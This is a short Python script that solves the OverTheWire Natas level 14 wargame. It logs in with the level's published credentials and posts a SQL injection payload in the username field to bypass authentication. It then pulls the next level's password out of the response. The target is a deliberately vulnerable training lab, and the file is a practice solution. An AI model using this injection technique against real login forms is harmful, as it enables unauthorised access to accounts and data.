import requests
import string
import re

auth = requests.auth.HTTPBasicAuth('natas14','Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1')
url = 'http://natas14.natas.labs.overthewire.org/?debug'

data = {'username':'" or 1=1-- '}
response = requests.post(url, auth=auth, data=data)
password = re.findall('The password for natas15 is (.*)<br>', response.text)[0]
print(password)

